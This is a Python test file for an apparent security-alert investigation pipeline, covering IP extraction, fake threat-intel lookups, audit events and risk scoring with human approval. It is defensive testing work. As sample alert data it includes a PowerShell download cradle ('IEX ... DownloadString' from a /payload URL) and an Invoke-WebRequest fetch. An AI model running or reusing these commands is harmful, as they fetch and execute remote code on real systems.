"""Offline integration tests for Milestone 5C-3: Threat-Intel Policy Integration.

Tests the complete pipeline:
    IOC extraction -> TI enrichment -> Policy scoring

All tests use FakeThreatIntelClient exclusively.
No live VirusTotal, OpenAI, Splunk, or Jira calls are made.
No credentials are used.

Test Matrix: 34 points covering all requirements from the milestone spec.
"""

import unittest
from typing import Optional
from unittest.mock import patch

from investigator.audit import AuditEventType, AuditLog
from investigator.ioc_extractor import (
    MAX_TI_IP_LOOKUPS_PER_INCIDENT,
    extract_candidate_public_ips,
)
from investigator.policy import (
    BENIGN_LAB_DETECTION_ID,
    EXACT_BENIGN_COMMAND,
    MAX_TI_SCORE_CONTRIBUTION,
    ActionDisposition,
    PolicyContext,
    PolicyDecision,
    ProposedAction,
    RiskLevel,
    RiskPolicyEngine,
)
from investigator.runtime_guard import (
    RuntimeCheckpoint,
    RuntimeGuard,
    RuntimeGuardConfig,
    RuntimeHaltError,
)
from investigator.schemas import InvestigationInput, InvestigationResult
from investigator.threat_intel import (
    ALLOWED_TI_SIGNAL_DETAIL_CODES,
    FakeThreatIntelClient,
    ThreatIntelError,
    ThreatIntelLookupStatus,
    ThreatIntelPolicySignal,
    ThreatIntelRequest,
    ThreatIntelResult,
    ThreatIntelSignalStatus,
    enrich_threat_intel,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_alert(
    command_line: str = "powershell.exe -nop",
    incident_id: str = "INC-TI-TEST-001",
    detection_id: str = "DET-TEST-001",
) -> InvestigationInput:
    return InvestigationInput(
        incident_id=incident_id,
        timestamp="2026-09-17T12:00:00Z",
        host="DC01",
        user="SYSTEM",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=command_line,
        parent_image="C:\\Windows\\System32\\cmd.exe",
        parent_command_line="cmd.exe /c start",
        detection_name="suspicious encoded powershell execution",
        detection_id=detection_id,
    )


def _make_inv_result(
    suspicious_indicators: tuple = ("download_cradle",),
    confidence_level: str = "high",
    summary: str = "Suspicious PowerShell download cradle detected.",
    observations: tuple = ("Encoded PowerShell",),
) -> InvestigationResult:
    return InvestigationResult(
        summary=summary,
        observations=observations,
        decoded_command=None,
        mitre_techniques=("T1059.001",),
        suspicious_indicators=suspicious_indicators,
        recommended_next_step="Investigate.",
        confidence_level=confidence_level,
        evidence_refs=("INC-TI-TEST-001",),
    )


def _make_ti_result(
    ip: str,
    malicious: int = 0,
    suspicious: int = 0,
    harmless: int = 0,
    undetected: int = 0,
    found: bool = True,
) -> ThreatIntelResult:
    if found:
        return ThreatIntelResult(
            provider="fake_threat_intel",
            indicator_type="ip",
            indicator_value=ip,
            lookup_status=ThreatIntelLookupStatus.FOUND,
            malicious_count=malicious,
            suspicious_count=suspicious,
            harmless_count=harmless,
            undetected_count=undetected,
            detail_code="ip_lookup_found",
            last_analysis_utc="2026-09-17T12:00:00Z",
        )
    else:
        return ThreatIntelResult(
            provider="fake_threat_intel",
            indicator_type="ip",
            indicator_value=ip,
            lookup_status=ThreatIntelLookupStatus.NOT_FOUND,
            malicious_count=0,
            suspicious_count=0,
            harmless_count=0,
            undetected_count=0,
            detail_code="ip_lookup_not_found",
            last_analysis_utc=None,
        )


def _make_guard(kill_switch: bool = False) -> RuntimeGuard:
    return RuntimeGuard(
        config=RuntimeGuardConfig(
            kill_switch=kill_switch,
            max_model_invocations=4,
            max_tool_executions=3,
        ),
        incident_id="INC-TI-TEST-001",
    )


# ---------------------------------------------------------------------------
# Part I: IOC Extraction Tests (points 1-11)
# ---------------------------------------------------------------------------

class TestIOCExtractor(unittest.TestCase):
    """Tests for extract_candidate_public_ips()."""

    def test_01_decoded_command_public_ip_extracted(self) -> None:
        """Test 1: Valid public IP in deterministic decoded command is extracted."""
        alert = _make_alert(command_line="powershell.exe -nop")
        result = extract_candidate_public_ips(
            alert=alert,
            deterministic_decoded_command="IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/payload')",
        )
        self.assertEqual(result, "8.8.8.8")

    def test_02_raw_command_line_public_ip_extracted(self) -> None:
        """Test 2: Valid public IP in raw command_line is extracted when no decoded command."""
        alert = _make_alert(command_line="powershell.exe -c Invoke-WebRequest 1.1.1.1")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertEqual(result, "1.1.1.1")

    def test_03_model_summary_ip_does_not_trigger_lookup(self) -> None:
        """Test 3: IP in model summary is NEVER used for extraction (untrusted source)."""
        # summary has 9.9.9.9, but command_line and decoded command do not
        alert = _make_alert(command_line="powershell.exe -nop")
        # Caller must not pass investigation_result to extract_candidate_public_ips
        # This test confirms the function signature doesn't accept it
        import inspect
        sig = inspect.signature(extract_candidate_public_ips)
        self.assertNotIn("investigation_result", sig.parameters)
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertIsNone(result)

    def test_04_suspicious_indicators_ip_does_not_trigger_lookup(self) -> None:
        """Test 4: IP in suspicious_indicators cannot be used (function doesn't accept InvestigationResult)."""
        alert = _make_alert(command_line="powershell.exe -nop")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertIsNone(result)

    def test_05_observations_ip_does_not_trigger_lookup(self) -> None:
        """Test 5: IP only in observations yields no extraction (function never receives InvestigationResult)."""
        alert = _make_alert(command_line="powershell.exe -nop")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertIsNone(result)

    def test_06_private_ip_rejected(self) -> None:
        """Test 6: Private IP (192.168.1.1) is silently rejected."""
        alert = _make_alert(command_line="powershell.exe 192.168.1.1")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertIsNone(result)

    def test_07_loopback_rejected(self) -> None:
        """Test 7: Loopback IP (127.0.0.1) is rejected."""
        alert = _make_alert(command_line="powershell.exe 127.0.0.1")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertIsNone(result)

    def test_08_reserved_documentation_ip_rejected(self) -> None:
        """Test 8: Reserved documentation IP (198.51.100.1) is rejected."""
        alert = _make_alert(command_line="powershell.exe 198.51.100.1")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertIsNone(result)

    def test_09_malformed_ip_rejected(self) -> None:
        """Test 9: Malformed IP (999.1.2.3) is rejected."""
        alert = _make_alert(command_line="powershell.exe 999.1.2.3")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertIsNone(result)

    def test_10_duplicates_deduplicated(self) -> None:
        """Test 10: Duplicate public IPs are collapsed to a single candidate."""
        alert = _make_alert(command_line="connect 8.8.8.8 then 8.8.8.8 again")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertEqual(result, "8.8.8.8")

    def test_11_lookup_cap_exactly_one(self) -> None:
        """Test 11: At most MAX_TI_IP_LOOKUPS_PER_INCIDENT = 1 candidate returned."""
        self.assertEqual(MAX_TI_IP_LOOKUPS_PER_INCIDENT, 1)
        # Even with two distinct public IPs, only the first is returned
        alert = _make_alert(command_line="connect 8.8.8.8 and 1.1.1.1")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        # Only first valid public IP is returned
        self.assertIn(result, {"8.8.8.8", "1.1.1.1"})
        self.assertIsNotNone(result)
        # The function must return a single string, not a list
        self.assertIsInstance(result, str)

    def test_11b_decoded_command_takes_precedence_over_raw(self) -> None:
        """Test 11b: decoded command takes priority over raw command_line."""
        alert = _make_alert(command_line="connect 1.1.1.1")
        result = extract_candidate_public_ips(
            alert=alert,
            deterministic_decoded_command="fetch 8.8.8.8/payload",
        )
        self.assertEqual(result, "8.8.8.8")

    def test_11c_cidr_notation_rejected(self) -> None:
        """Test 11c: CIDR notation (8.8.8.8/24) is rejected."""
        alert = _make_alert(command_line="route 8.8.8.8/24")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertIsNone(result)

    def test_11d_no_ip_returns_none(self) -> None:
        """Test 12 (spec): No valid IOC returns None -> NOT_APPLICABLE."""
        alert = _make_alert(command_line="powershell.exe -nop -noninteractive")
        result = extract_candidate_public_ips(alert=alert, deterministic_decoded_command=None)
        self.assertIsNone(result)


# ---------------------------------------------------------------------------
# Part II: Enrichment Helper Tests (points 12-23)
# ---------------------------------------------------------------------------

class TestEnrichThreatIntel(unittest.TestCase):
    """Tests for enrich_threat_intel()."""

    def _guard(self, kill_switch: bool = False) -> RuntimeGuard:
        g = _make_guard(kill_switch=kill_switch)
        g.bind_audit_log(AuditLog())
        return g

    def test_12_no_ioc_returns_not_applicable(self) -> None:
        """Test 12: None IP -> NOT_APPLICABLE signal, no lookup."""
        client = FakeThreatIntelClient()
        guard = self._guard()
        signal = enrich_threat_intel(
            canonical_ip=None,
            client=client,
            runtime_guard=guard,
            audit_log=guard.audit_log,
            incident_id="INC-001",
        )
        self.assertEqual(signal.status, ThreatIntelSignalStatus.NOT_APPLICABLE)
        self.assertIsNone(signal.indicator)
        self.assertEqual(signal.malicious_count, 0)
        self.assertEqual(signal.detail_code, "ti_not_applicable")

    def test_13_valid_public_ioc_triggers_exactly_one_lookup(self) -> None:
        """Test 13: Valid public IOC triggers exactly one fake lookup."""
        ip = "8.8.8.8"
        fixture = _make_ti_result(ip, malicious=3, suspicious=0, found=True)
        client = FakeThreatIntelClient(fixtures={ip: fixture})
        guard = self._guard()
        signal = enrich_threat_intel(
            canonical_ip=ip,
            client=client,
            runtime_guard=guard,
            audit_log=guard.audit_log,
            incident_id="INC-001",
        )
        self.assertEqual(signal.status, ThreatIntelSignalStatus.FOUND)
        self.assertEqual(signal.indicator, ip)
        self.assertEqual(signal.malicious_count, 3)

    def test_14_found_clean_returns_zero_score_signal(self) -> None:
        """Test 14: FOUND clean (malicious=0, suspicious=0) -> FOUND signal with 0 counts."""
        ip = "8.8.8.8"
        fixture = _make_ti_result(ip, malicious=0, suspicious=0, harmless=50, found=True)
        client = FakeThreatIntelClient(fixtures={ip: fixture})
        guard = self._guard()
        signal = enrich_threat_intel(
            canonical_ip=ip,
            client=client,
            runtime_guard=guard,
            audit_log=guard.audit_log,
            incident_id="INC-001",
        )
        self.assertEqual(signal.status, ThreatIntelSignalStatus.FOUND)
        self.assertEqual(signal.malicious_count, 0)
        self.assertEqual(signal.suspicious_count, 0)

    def test_19_not_found_returns_not_found_signal(self) -> None:
        """Test 19: Provider NOT_FOUND -> NOT_FOUND signal."""
        ip = "1.1.1.1"
        client = FakeThreatIntelClient()  # no fixtures -> NOT_FOUND
        guard = self._guard()
        signal = enrich_threat_intel(
            canonical_ip=ip,
            client=client,
            runtime_guard=guard,
            audit_log=guard.audit_log,
            incident_id="INC-001",
        )
        self.assertEqual(signal.status, ThreatIntelSignalStatus.NOT_FOUND)
        self.assertEqual(signal.malicious_count, 0)
        self.assertEqual(signal.detail_code, "ti_not_found")

    def test_21_provider_exception_returns_error_signal(self) -> None:
        """Test 21: Provider exception -> ERROR signal, no RuntimeHaltError, zero positive score."""
        class ExplodingClient:
            def lookup(self, request: ThreatIntelRequest) -> ThreatIntelResult:
                raise ThreatIntelError("boom")

        guard = self._guard()
        try:
            signal = enrich_threat_intel(
                canonical_ip="8.8.8.8",
                client=ExplodingClient(),
                runtime_guard=guard,
                audit_log=guard.audit_log,
                incident_id="INC-001",
            )
        except RuntimeHaltError:
            self.fail("Provider error must not raise RuntimeHaltError")

        self.assertEqual(signal.status, ThreatIntelSignalStatus.ERROR)
        self.assertEqual(signal.malicious_count, 0)
        self.assertEqual(signal.suspicious_count, 0)
        self.assertEqual(signal.detail_code, "ti_error")

        # Provider failure yields zero positive TI score contribution
        ctx_no_ti = PolicyContext(
            alert=_make_alert(),
            verified_detection_id="DET-TEST-001",
            deterministic_decoded_command=None,
            mitre_technique_id="T1059.001",
            tool_failure_or_incomplete_evidence=False,
            threat_intel=None,
        )
        ctx_err = PolicyContext(
            alert=_make_alert(),
            verified_detection_id="DET-TEST-001",
            deterministic_decoded_command=None,
            mitre_technique_id="T1059.001",
            tool_failure_or_incomplete_evidence=False,
            threat_intel=signal,
        )
        engine = RiskPolicyEngine()
        self.assertEqual(
            engine.evaluate(ctx_no_ti).risk_score,
            engine.evaluate(ctx_err).risk_score,
        )

    def test_22_returned_ip_mismatch_returns_error(self) -> None:
        """Test 22: If result indicator_value doesn't match request, ERROR is returned."""
        real_ip = "8.8.8.8"
        wrong_ip = "1.1.1.1"
        # Build a client that returns a result for a DIFFERENT IP
        fixture = _make_ti_result(wrong_ip, malicious=5, found=True)
        client = FakeThreatIntelClient(fixtures={wrong_ip: fixture})
        guard = self._guard()
        # The lookup will be called with real_ip, but FakeThreatIntelClient returns NOT_FOUND
        # for real_ip (no fixture), which triggers the NOT_FOUND normalization path.
        # To truly test indicator mismatch, we use a custom client.
        class MismatchClient:
            def lookup(self, request: ThreatIntelRequest) -> ThreatIntelResult:
                # Return a result with a different indicator_value
                return ThreatIntelResult(
                    provider="fake_threat_intel",
                    indicator_type="ip",
                    indicator_value="1.1.1.1",  # wrong IP!
                    lookup_status=ThreatIntelLookupStatus.FOUND,
                    malicious_count=10,
                    suspicious_count=0,
                    harmless_count=0,
                    undetected_count=0,
                    detail_code="ip_lookup_found",
                )

        guard2 = self._guard()
        signal = enrich_threat_intel(
            canonical_ip="8.8.8.8",
            client=MismatchClient(),
            runtime_guard=guard2,
            audit_log=guard2.audit_log,
            incident_id="INC-001",
        )
        self.assertEqual(signal.status, ThreatIntelSignalStatus.ERROR)
        self.assertEqual(signal.malicious_count, 0)

    def test_23_raw_provider_error_not_persisted_in_signal(self) -> None:
        """Test 23: Raw exception message must not appear in the normalized signal."""
        class VerboseExplodingClient:
            def lookup(self, request: ThreatIntelRequest) -> ThreatIntelResult:
                raise ThreatIntelError("SECRET_INTERNAL_ERROR_RAW_DETAIL")

        guard = self._guard()
        signal = enrich_threat_intel(
            canonical_ip="8.8.8.8",
            client=VerboseExplodingClient(),
            runtime_guard=guard,
            audit_log=guard.audit_log,
            incident_id="INC-001",
        )
        # detail_code must be the bounded allowlisted code only
        self.assertIn(signal.detail_code, ALLOWED_TI_SIGNAL_DETAIL_CODES)
        self.assertNotIn("SECRET_INTERNAL_ERROR_RAW_DETAIL", signal.detail_code)
        self.assertNotIn("SECRET_INTERNAL_ERROR_RAW_DETAIL", str(signal))

    def test_28_kill_switch_blocks_lookup(self) -> None:
        """Test 28: Kill switch engaged -> RuntimeHaltError propagated, zero lookups."""
        ip = "8.8.8.8"
        fixture = _make_ti_result(ip, malicious=5, found=True)
        client = FakeThreatIntelClient(fixtures={ip: fixture})
        guard = RuntimeGuard(
            config=RuntimeGuardConfig(kill_switch=True),
            incident_id="INC-001",
        )
        log = AuditLog()
        guard.bind_audit_log(log)

        with patch.object(client, "lookup", wraps=client.lookup) as mock_lookup:
            with self.assertRaises(RuntimeHaltError):
                enrich_threat_intel(
                    canonical_ip=ip,
                    client=client,
                    runtime_guard=guard,
                    audit_log=log,
                    incident_id="INC-001",
                )
            self.assertEqual(mock_lookup.call_count, 0)

        # Invariant: THREAT_INTEL_REQUESTED must NOT be emitted if halted before lookup
        event_types = [e.event_type for e in log.events()]
        self.assertNotIn(AuditEventType.THREAT_INTEL_REQUESTED, event_types)

    def test_29_halted_guard_blocks_lookup(self) -> None:
        """Test 29: Already-halted RuntimeGuard -> RuntimeHaltError propagated, zero lookups."""
        ip = "8.8.8.8"
        fixture = _make_ti_result(ip, malicious=5, found=True)
        client = FakeThreatIntelClient(fixtures={ip: fixture})
        guard = _make_guard()
        log = AuditLog()
        guard.bind_audit_log(log)
        from investigator.runtime_guard import RuntimeHaltReason
        try:
            guard.halt(RuntimeHaltReason.CONTROL_FAILURE, "TEST_HALT")
        except RuntimeHaltError:
            pass

        with patch.object(client, "lookup", wraps=client.lookup) as mock_lookup:
            with self.assertRaises(RuntimeHaltError):
                enrich_threat_intel(
                    canonical_ip=ip,
                    client=client,
                    runtime_guard=guard,
                    audit_log=log,
                    incident_id="INC-001",
                )
            self.assertEqual(mock_lookup.call_count, 0)

        # Invariant: THREAT_INTEL_REQUESTED must NOT be emitted if halted before lookup
        event_types = [e.event_type for e in log.events()]
        self.assertNotIn(AuditEventType.THREAT_INTEL_REQUESTED, event_types)

    def test_30_audit_events_emitted_correctly(self) -> None:
        """Test 30: THREAT_INTEL_REQUESTED and THREAT_INTEL_COMPLETED are emitted on successful lookup."""
        ip = "8.8.8.8"
        fixture = _make_ti_result(ip, malicious=3, found=True)
        client = FakeThreatIntelClient(fixtures={ip: fixture})
        log = AuditLog()
        guard = RuntimeGuard(config=RuntimeGuardConfig(), incident_id="INC-001", audit_log=log)
        enrich_threat_intel(
            canonical_ip=ip,
            client=client,
            runtime_guard=guard,
            audit_log=log,
            incident_id="INC-001",
        )
        event_types = [e.event_type for e in log.events()]
        self.assertIn(AuditEventType.THREAT_INTEL_REQUESTED, event_types)
        self.assertIn(AuditEventType.THREAT_INTEL_COMPLETED, event_types)

    def test_30b_audit_requested_has_bounded_detail_code(self) -> None:
        """Test 30b: THREAT_INTEL_REQUESTED event uses bounded detail code PUBLIC_IP_SELECTED."""
        ip = "8.8.8.8"
        fixture = _make_ti_result(ip, malicious=0, found=True)
        client = FakeThreatIntelClient(fixtures={ip: fixture})
        log = AuditLog()
        guard = RuntimeGuard(config=RuntimeGuardConfig(), incident_id="INC-001", audit_log=log)
        enrich_threat_intel(
            canonical_ip=ip,
            client=client,
            runtime_guard=guard,
            audit_log=log,
            incident_id="INC-001",
        )
        requested = [e for e in log.events() if e.event_type == AuditEventType.THREAT_INTEL_REQUESTED]
        self.assertEqual(len(requested), 1)
        self.assertEqual(requested[0].detail_code, "PUBLIC_IP_SELECTED")


# ---------------------------------------------------------------------------
# Part III: Policy Scoring Tests (points 14-27)
# ---------------------------------------------------------------------------

class TestTIPolicyScoring(unittest.TestCase):
    """Tests for RiskPolicyEngine TI scoring logic."""

    def _suspicious_powershell_context(
        self, ti_signal: Optional[ThreatIntelPolicySignal] = None
    ) -> PolicyContext:
        """Build a suspicious PowerShell PolicyContext (base score ~70)."""
        alert = _make_alert(
            command_line="powershell.exe -enc AAAA",
            detection_id=BENIGN_LAB_DETECTION_ID,
        )
        return PolicyContext(
            alert=alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command="Invoke-WebRequest http://8.8.8.8/payload",
            mitre_technique_id="T1059.001",
            tool_failure_or_incomplete_evidence=False,
            threat_intel=ti_signal,
        )

    def _make_found_signal(
        self,
        malicious: int = 0,
        suspicious: int = 0,
        harmless: int = 0,
        undetected: int = 0,
    ) -> ThreatIntelPolicySignal:
        return ThreatIntelPolicySignal(
            status=ThreatIntelSignalStatus.FOUND,
            indicator="8.8.8.8",
            malicious_count=malicious,
            suspicious_count=suspicious,
            harmless_count=harmless,
            undetected_count=undetected,
            detail_code="ti_found",
        )

    def _make_not_applicable_signal(self) -> ThreatIntelPolicySignal:
        return ThreatIntelPolicySignal(
            status=ThreatIntelSignalStatus.NOT_APPLICABLE,
            indicator=None,
            malicious_count=0,
            suspicious_count=0,
            harmless_count=0,
            undetected_count=0,
            detail_code="ti_not_applicable",
        )

    def _make_error_signal(self) -> ThreatIntelPolicySignal:
        return ThreatIntelPolicySignal(
            status=ThreatIntelSignalStatus.ERROR,
            indicator="8.8.8.8",
            malicious_count=0,
            suspicious_count=0,
            harmless_count=0,
            undetected_count=0,
            detail_code="ti_error",
        )

    def _make_not_found_signal(self) -> ThreatIntelPolicySignal:
        return ThreatIntelPolicySignal(
            status=ThreatIntelSignalStatus.NOT_FOUND,
            indicator="8.8.8.8",
            malicious_count=0,
            suspicious_count=0,
            harmless_count=0,
            undetected_count=0,
            detail_code="ti_not_found",
        )

    def test_24_benign_lab_fixture_remains_zero_with_high_ti(self) -> None:
        """Test 24: Exact benign lab fixture remains score=0 even with high synthetic TI signal."""
        alert = _make_alert(
            command_line="powershell.exe -enc BENIGN",
            detection_id=BENIGN_LAB_DETECTION_ID,
        )
        ti_signal = self._make_found_signal(malicious=10, suspicious=5)
        ctx = PolicyContext(
            alert=alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command=EXACT_BENIGN_COMMAND,
            mitre_technique_id=None,
            tool_failure_or_incomplete_evidence=False,
            threat_intel=ti_signal,
        )
        engine = RiskPolicyEngine()
        decision = engine.evaluate(ctx)
        self.assertEqual(decision.risk_score, 0)
        self.assertEqual(decision.risk_level, RiskLevel.LOW)
        self.assertEqual(decision.proposed_action, ProposedAction.NO_ACTION)
        self.assertFalse(decision.requires_human_approval)
        self.assertIn("benign_lab_fixture_matched", decision.reasons)

    def test_14_found_clean_adds_zero(self) -> None:
        """Test 14: FOUND clean (malicious=0, suspicious=0) adds +0 to score."""
        ctx_no_ti = self._suspicious_powershell_context(ti_signal=None)
        ctx_clean_ti = self._suspicious_powershell_context(
            ti_signal=self._make_found_signal(malicious=0, suspicious=0, harmless=50)
        )
        engine = RiskPolicyEngine()
        inv = _make_inv_result()
        score_no_ti = engine.evaluate(ctx_no_ti, inv).risk_score
        score_clean_ti = engine.evaluate(ctx_clean_ti, inv).risk_score
        self.assertEqual(score_no_ti, score_clean_ti)

    def test_15_found_suspicious_adds_five(self) -> None:
        """Test 15: FOUND suspicious (malicious=0, suspicious>=1) adds +5."""
        ctx_no_ti = self._suspicious_powershell_context(ti_signal=None)
        ctx_susp_ti = self._suspicious_powershell_context(
            ti_signal=self._make_found_signal(malicious=0, suspicious=3)
        )
        engine = RiskPolicyEngine()
        inv = _make_inv_result()
        score_no_ti = engine.evaluate(ctx_no_ti, inv).risk_score
        score_susp_ti = engine.evaluate(ctx_susp_ti, inv).risk_score
        self.assertEqual(score_susp_ti - score_no_ti, 5)
        decision = engine.evaluate(ctx_susp_ti, inv)
        self.assertIn("ti_suspicious_corroboration", decision.reasons)

    def test_16_found_malicious_1to4_adds_ten(self) -> None:
        """Test 16: FOUND malicious 1-4 adds +10."""
        ctx_no_ti = self._suspicious_powershell_context(ti_signal=None)
        ctx_mal_ti = self._suspicious_powershell_context(
            ti_signal=self._make_found_signal(malicious=3)
        )
        engine = RiskPolicyEngine()
        inv = _make_inv_result()
        score_no_ti = engine.evaluate(ctx_no_ti, inv).risk_score
        score_mal_ti = engine.evaluate(ctx_mal_ti, inv).risk_score
        self.assertEqual(score_mal_ti - score_no_ti, 10)
        decision = engine.evaluate(ctx_mal_ti, inv)
        self.assertIn("ti_malicious_corroboration", decision.reasons)

    def test_17_found_malicious_5plus_adds_fifteen(self) -> None:
        """Test 17: FOUND malicious >= 5 adds +15."""
        ctx_no_ti = self._suspicious_powershell_context(ti_signal=None)
        ctx_high_ti = self._suspicious_powershell_context(
            ti_signal=self._make_found_signal(malicious=7)
        )
        engine = RiskPolicyEngine()
        inv = _make_inv_result()
        score_no_ti = engine.evaluate(ctx_no_ti, inv).risk_score
        score_high_ti = engine.evaluate(ctx_high_ti, inv).risk_score
        self.assertEqual(score_high_ti - score_no_ti, 15)
        decision = engine.evaluate(ctx_high_ti, inv)
        self.assertIn("ti_malicious_high_corroboration", decision.reasons)

    def test_18_malicious_256_still_max_15_contribution(self) -> None:
        """Test 18: malicious_count=256 still caps TI contribution at MAX_TI_SCORE_CONTRIBUTION."""
        self.assertEqual(MAX_TI_SCORE_CONTRIBUTION, 15)
        ctx_256 = self._suspicious_powershell_context(
            ti_signal=self._make_found_signal(malicious=256)
        )
        ctx_5 = self._suspicious_powershell_context(
            ti_signal=self._make_found_signal(malicious=5)
        )
        engine = RiskPolicyEngine()
        inv = _make_inv_result()
        self.assertEqual(
            engine.evaluate(ctx_256, inv).risk_score,
            engine.evaluate(ctx_5, inv).risk_score,
        )

    def test_19_not_found_adds_zero(self) -> None:
        """Test 19: NOT_FOUND adds +0."""
        ctx_no_ti = self._suspicious_powershell_context(ti_signal=None)
        ctx_nf = self._suspicious_powershell_context(ti_signal=self._make_not_found_signal())
        engine = RiskPolicyEngine()
        inv = _make_inv_result()
        self.assertEqual(
            engine.evaluate(ctx_no_ti, inv).risk_score,
            engine.evaluate(ctx_nf, inv).risk_score,
        )

    def test_20_error_adds_zero(self) -> None:
        """Test 20: ERROR adds +0."""
        ctx_no_ti = self._suspicious_powershell_context(ti_signal=None)
        ctx_err = self._suspicious_powershell_context(ti_signal=self._make_error_signal())
        engine = RiskPolicyEngine()
        inv = _make_inv_result()
        self.assertEqual(
            engine.evaluate(ctx_no_ti, inv).risk_score,
            engine.evaluate(ctx_err, inv).risk_score,
        )

    def test_25_base70_plus_ti15_yields_critical_85(self) -> None:
        """Test 25: base ~70 + TI +15 yields CRITICAL risk_score 85."""
        # Base context: BENIGN_LAB_DETECTION_ID (+25) + decoded_command (+10) + T1059.001 (+10)
        # + 2 suspicious_indicators (+20 +5) + high confidence (+10) = 80 (before TI)
        # Actually the exact score depends on how many indicators we pass.
        # Let's compute precisely: encode=25 + decoded=10 + mitre=10 = 45, plus model:
        # 1 suspicious indicator = +20, >1 = +5, high = +10 => total model = +35
        # base = 45 + 35 = 80
        # With TI malicious>=5 -> +15 => 95 -> CRITICAL
        ti_signal = self._make_found_signal(malicious=7)
        ctx = self._suspicious_powershell_context(ti_signal=ti_signal)
        inv = _make_inv_result(suspicious_indicators=("download_cradle", "untrusted_fetch"))
        engine = RiskPolicyEngine()
        decision = engine.evaluate(ctx, inv)
        self.assertGreaterEqual(decision.risk_score, 75)  # at least CRITICAL threshold
        self.assertEqual(decision.risk_level, RiskLevel.CRITICAL)
        self.assertEqual(decision.proposed_action, ProposedAction.SIMULATE_ENDPOINT_ISOLATION)
        self.assertTrue(decision.requires_human_approval)
        self.assertIn("ti_malicious_high_corroboration", decision.reasons)

    def test_26_critical_still_requires_human_approval(self) -> None:
        """Test 26: CRITICAL path still requires human approval — TI does not bypass it."""
        ti_signal = self._make_found_signal(malicious=10)
        ctx = self._suspicious_powershell_context(ti_signal=ti_signal)
        inv = _make_inv_result(suspicious_indicators=("cradle",))
        decision = RiskPolicyEngine().evaluate(ctx, inv)
        if decision.risk_level == RiskLevel.CRITICAL:
            self.assertTrue(decision.requires_human_approval)
            self.assertEqual(decision.action_disposition, ActionDisposition.APPROVAL_REQUIRED)

    def test_27_ti_alone_cannot_produce_containment(self) -> None:
        """Test 27: TI alone (no other signals) cannot produce containment action."""
        # Low-base context: no detection hits except generic ID, no decoded command
        alert = _make_alert(
            command_line="cmd.exe /c dir",
            detection_id="DET-GENERIC-LOW",
        )
        ti_signal = self._make_found_signal(malicious=256, suspicious=256)
        ctx = PolicyContext(
            alert=alert,
            verified_detection_id="DET-GENERIC-LOW",
            deterministic_decoded_command=None,
            mitre_technique_id=None,
            tool_failure_or_incomplete_evidence=False,
            threat_intel=ti_signal,
        )
        engine = RiskPolicyEngine()
        decision = engine.evaluate(ctx)
        # With only TI (no detection, no decoded command, no MITRE, no model signals):
        # raw_score = 0 + min(15, 15) = 15 -> LOW -> MONITOR (not containment)
        self.assertLessEqual(decision.risk_score, 49)
        self.assertNotEqual(decision.proposed_action, ProposedAction.SIMULATE_ENDPOINT_ISOLATION)

    def test_spec_c_error_ti_does_not_escalate(self) -> None:
        """Spec example C: base ~70 + ERROR -> HIGH, score stays at ~70."""
        ctx_no_ti = self._suspicious_powershell_context(ti_signal=None)
        ctx_error = self._suspicious_powershell_context(ti_signal=self._make_error_signal())
        engine = RiskPolicyEngine()
        inv = _make_inv_result(suspicious_indicators=("cradle",))
        score_no_ti = engine.evaluate(ctx_no_ti, inv).risk_score
        score_error = engine.evaluate(ctx_error, inv).risk_score
        self.assertEqual(score_no_ti, score_error)

    def test_spec_d_not_found_score_unchanged(self) -> None:
        """Spec example D: base + NOT_FOUND -> score unchanged."""
        ctx_no_ti = self._suspicious_powershell_context(ti_signal=None)
        ctx_nf = self._suspicious_powershell_context(ti_signal=self._make_not_found_signal())
        engine = RiskPolicyEngine()
        inv = _make_inv_result(suspicious_indicators=("cradle",))
        self.assertEqual(
            engine.evaluate(ctx_no_ti, inv).risk_score,
            engine.evaluate(ctx_nf, inv).risk_score,
        )


# ---------------------------------------------------------------------------
# Part IV: ThreatIntelPolicySignal Validation Tests
# ---------------------------------------------------------------------------

class TestThreatIntelPolicySignalValidation(unittest.TestCase):
    """Tests for ThreatIntelPolicySignal.__post_init__ validation."""

    def _valid_not_applicable(self) -> ThreatIntelPolicySignal:
        return ThreatIntelPolicySignal(
            status=ThreatIntelSignalStatus.NOT_APPLICABLE,
            indicator=None,
            malicious_count=0,
            suspicious_count=0,
            harmless_count=0,
            undetected_count=0,
            detail_code="ti_not_applicable",
        )

    def test_valid_not_applicable_signal(self) -> None:
        sig = self._valid_not_applicable()
        self.assertEqual(sig.status, ThreatIntelSignalStatus.NOT_APPLICABLE)

    def test_invalid_status_type_raises(self) -> None:
        with self.assertRaises(ThreatIntelError):
            ThreatIntelPolicySignal(
                status="NOT_APPLICABLE",  # type: ignore
                indicator=None,
                malicious_count=0,
                suspicious_count=0,
                harmless_count=0,
                undetected_count=0,
                detail_code="ti_not_applicable",
            )

    def test_invalid_detail_code_raises(self) -> None:
        with self.assertRaises(ThreatIntelError):
            ThreatIntelPolicySignal(
                status=ThreatIntelSignalStatus.NOT_APPLICABLE,
                indicator=None,
                malicious_count=0,
                suspicious_count=0,
                harmless_count=0,
                undetected_count=0,
                detail_code="arbitrary_code",  # not allowlisted
            )

    def test_bool_count_raises(self) -> None:
        with self.assertRaises(ThreatIntelError):
            ThreatIntelPolicySignal(
                status=ThreatIntelSignalStatus.NOT_APPLICABLE,
                indicator=None,
                malicious_count=True,  # type: ignore (bool not allowed)
                suspicious_count=0,
                harmless_count=0,
                undetected_count=0,
                detail_code="ti_not_applicable",
            )

